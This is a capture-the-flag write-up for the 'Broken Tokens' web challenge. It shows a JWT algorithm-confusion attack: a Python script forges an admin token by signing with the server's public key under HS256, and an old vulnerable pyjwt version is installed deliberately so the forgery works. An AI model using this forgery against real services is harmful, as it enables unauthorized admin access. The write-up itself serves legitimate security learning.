# Broken Tokens [web]

- Score: 100
- Solves: 335

## Solution

The server souce code is given.

The authentication information is encoded by JWT and stored in the cookie, and it is decoded at GET requests to verify that the user is admin.

Since [the public key](publickey.pem) is given, we can secceed a typical JWT attack: changing the algorithm from RS256 to HS256.

- More info: [Hacking JSON Web Token (JWT)](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)

**solver.py**

```python
import jwt

public_key = open("publickey.pem", "r").read()

print(public_key)

print(jwt.encode({"auth": "admin"}, public_key, algorithm="HS256"))
```

Execute:

```fish
$ pip install pyjwt
$ python solve.py
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----

Traceback (most recent call last):
  File "solver.py", line 9, in <module>
    print(jwt.encode({"auth": "admin"}, public_key, algorithm="HS256"))
  File "/home/ark/.pyenv/versions/3.8.1/lib/python3.8/site-packages/jwt/api_jwt.py", line 64, in encode
    return super(PyJWT, self).encode(
  File "/home/ark/.pyenv/versions/3.8.1/lib/python3.8/site-packages/jwt/api_jws.py", line 113, in encode
    key = alg_obj.prepare_key(key)
  File "/home/ark/.pyenv/versions/3.8.1/lib/python3.8/site-packages/jwt/algorithms.py", line 150, in prepare_key
    raise InvalidKeyError(
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

However, the current version of pyjwt takes measures against this attack, so an error occurs.

- ref. https://security.stackexchange.com/a/187279

Okey, try again with version 0.4.3:

```fish
$ pip install pyjwt==0.4.3
$ python solver.py
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----

b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4'
```


Set `auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4` into the cookie and access again.

Displayed:

```
Logged in as admin
The flag is flag{1n53cur3_tok3n5_5474212}
```

## Flag

flag{1n53cur3_tok3n5_5474212}
